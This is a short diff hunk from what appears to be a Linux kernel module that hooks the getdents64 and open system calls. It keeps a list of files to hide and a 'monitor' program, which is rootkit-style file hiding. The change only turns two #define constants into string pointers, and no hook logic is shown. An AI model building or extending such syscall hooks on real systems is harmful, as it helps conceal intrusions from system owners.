@@ -24,8 +24,8 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 
 /*************** What file we gonna hide ********************/
-#define INEXISTFILE "HIDEAFILEINKERNEL"
-#define INEXISTMONITOR "SETMONITORPROGRAM"
+char *INEXISTFILE = "HIDEAFILEINKERNEL";
+char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
 int filenum;
